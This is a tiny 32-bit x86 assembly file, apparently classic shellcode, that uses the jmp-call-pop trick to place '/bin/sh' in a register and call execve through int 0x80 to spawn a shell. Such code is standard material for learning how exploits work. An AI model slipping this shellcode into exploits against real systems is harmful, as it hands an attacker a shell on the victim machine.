BITS 32
global _start

_start:
	mov eax, 11
	jmp buf
setebx:
	pop ebx
	mov ecx, 0
	mov edx, 0
	int 0x80
	
buf:
	call setebx
	db '/bin/sh', 0
